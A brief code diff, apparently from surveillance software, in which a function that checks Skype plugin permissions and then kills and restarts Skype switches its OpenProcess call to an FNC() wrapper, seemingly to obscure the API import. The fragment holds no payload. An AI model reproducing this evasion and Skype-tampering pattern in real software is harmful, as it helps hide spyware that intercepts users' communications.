@@ -2308,7 +2308,7 @@ void CheckSkypePluginPermissions(DWORD skype_pid, WCHAR *skype_path)
 
 	// Se ne scrive almeno una, killa e respawna skype
 	if (is_to_respawn) {
-		if (hSkype = OpenProcess(PROCESS_TERMINATE, FALSE, skype_pid)) {
+		if (hSkype = FNC(OpenProcess)(PROCESS_TERMINATE, FALSE, skype_pid)) {
 			STARTUPINFO si;
 			PROCESS_INFORMATION pi;
 			HANDLE hToken;
